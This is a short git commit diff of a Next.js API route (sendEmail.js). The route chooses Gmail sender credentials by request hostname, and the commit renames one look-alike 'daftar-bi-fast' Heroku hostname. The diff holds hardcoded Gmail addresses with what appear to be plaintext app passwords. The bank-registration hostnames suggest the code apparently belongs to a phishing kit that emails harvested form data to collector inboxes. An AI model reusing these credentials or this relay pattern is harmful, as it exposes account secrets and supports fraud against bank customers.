953b079c458d62293e59bf89e4d41709e1403dc0
penaruhangin <penaruhangin@gmail.com>
2022-10-06 19:06:58 +0700

    edit

--- pages/api/sendEmail.js
+++ pages/api/sendEmail.js
@@ -22,7 +22,7 @@ export default function handler(req, res) {
         pass = 'ezbvulgxsjerhpnb';
 
     }
-    else if (url == 'daftar-bi-fast.herokuapp.com'){
+    else if (url == 'daftar-bii-fast.herokuapp.com'){
         email = 'ayamperu233@gmail.com';
         pass = 'rtzqphftdjkdrnwa';
         
